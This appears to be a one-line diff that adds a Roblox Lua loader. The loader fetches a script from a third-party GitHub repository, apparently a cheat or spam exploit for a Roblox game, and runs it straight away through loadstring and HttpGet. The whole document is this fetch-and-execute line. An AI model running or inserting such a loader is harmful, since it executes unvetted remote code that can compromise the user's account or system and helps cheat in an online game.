@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/now-paint-to-get-rich-spam3-h6c4opgtjoejls.lua"))()
